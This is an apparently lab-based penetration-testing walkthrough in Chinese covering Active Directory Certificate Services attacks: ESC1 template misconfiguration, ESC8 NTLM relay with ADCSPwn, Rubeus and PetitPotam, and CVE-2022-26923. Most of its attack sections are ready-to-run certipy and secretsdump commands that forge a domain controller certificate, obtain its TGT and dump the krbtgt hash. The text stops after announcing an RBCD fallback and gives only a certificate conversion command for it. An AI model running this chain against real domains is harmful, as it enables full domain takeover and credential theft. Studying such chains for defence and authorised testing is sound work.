## ESC1

### 漏洞配置

ESC1利用前提条件：

*   **msPKI-Certificates-Name-Flag: ENROLLEE\_SUPPLIES\_SUBJECT**  
    表示基于此证书模板申请新证书的用户可以为其他用户申请证书，即任何用户，包括域管理员用户
    
*   **PkiExtendedKeyUsage: Client Authentication**  
    表示将基于此证书模板生成的证书可用于对 Active Directory 中的计算机进行身份验证
    
*   **Enrollment Rights: NT Authority\\Authenticated Users**  
    表示允许 Active Directory 中任何经过身份验证的用户请求基于此证书模板生成的新证书
    

创建模板ESC1开启`ENROLLEE_SUPPLIES_SUBJECT`:

![](../Images/aa7ca1910591fd1cb2c0c76466d9c418.png)

将模板用于客户端身份验证(`Client Authentication`)：

![](../Images/f11a6e5f23dc0a1511c3556b0c7f685c.png)

  

设置权限允许普通用户注册(`Authenticated Users` or `Domain Users`)：

![](../Images/71d0f976770b9d6af0f0abc7bd205dfc.png)

认证后的用户/域用户随便勾一个就行了

## ESC8

### 漏洞简介

ADCS在默认安装的时候，其Web接口支持NTLM身份验证并且没有启用任何NTLM Relay保护措施。强制域控制器计算机帐户(DC$)向配置了NTLM中继的主机进行身份验证。身份验证被转发给证书颁发机构(CA)并提出对证书的请求。获取到了DC$的证书后就可以为用户/机器请求TGS/TGT票据，获取相应的权限。

### 漏洞利用

```
certipy find -u zhangsan@red.lab -p zs@123456 -dc-ip 192.168.149.133 -vulnerable -stdout
```

![](../Images/042eb9cd3693ad9ffac694ba875fcfdc.png)

### 域内

```
execute-assembly \path\ADCSPwn.exe --adcs ADCS.red.lab --remote DC2012.red.lab
```

![](../Images/a75f9af8c54dca0efbc99deba0503770.png)

```

execute-assembly \path\Rubeus.exe asktgt /user:DC2012$ /certificate:<base64-certificate> /ptt
```

![](../Images/4b20f103ab00d5b0d5a7159adf83609c.png)

![](../Images/139d9194345426da561ee1c7eed7e54a.png)

![](../Images/5de436591feedc7b907f8608a9503e33.png)

使用ADCSpwn打ESC8需要域控启用`WebClient`服务，默认是没有安装该功能的。  
DC安装桌面体验重启即可：

![](../Images/c13ac48db8a6237785e8476177be1f25.png)

![](../Images/2bcab392a185002eda4a7812b3c2c8f1.png)

### 域外

```
PetitPotam.py Relayip DCip
```

让域控强制向我们控制的WIN10发起认证

![](../Images/612ba6919172c6ed21c15b4306060174.png)

## CVE-2022–26923

### 漏洞简介

该漏洞允许低权限用户在安装了 Active Directory 证书服务 (AD CS) 服务器角色的默认 Active Directory 环境中将权限提升到域管理员。在默认安装的ADCS里就启用了`Machine`模板。

### 漏洞利用

添加机器账户，并将该机器账户dnsHostName指向DC\[MAQ默认为10\]:

```
certipy account create -u zhangsan@red.lab -p zs@123456 -dc-ip 192.168.149.133 -user win -pass win@123456 -dns 'DC2012.red.lab'
```

![](../Images/1b9ebb573eca67d426d39a844c4eccfe.png)

用该机器账户向ADCS请求证书：

```
certipy req -u 'win$'@red.lab -p win@123456 -target 192.168.149.135 -ca red-ADCS-CA -template Machine
```

  

![](../Images/d4f1bd140b794687a88953d8d2e26bbc.png)

  

用申请的证书请求DC$的TGT:

```
certipy auth -pfx dc2012.pfx -dc-ip 192.168.149.133
```

![](../Images/448854d7e56bd13e1995e707ab223ca0.png)

用DC$的nthash去DCSync:

```
secretsdump.py red.lab/'DC2012$'@192.168.149.133 -just-dc-user red/krbtgt -hashes :nthash
```

![](../Images/8d28623854784d63daabeeba85e62558.png)

如果使用`certipy`请求TGT失败，还可以设置RBCD来攻击：

```




openssl pkcs12 -in dc2012.pfx -out dc2012.pem -nodes
```
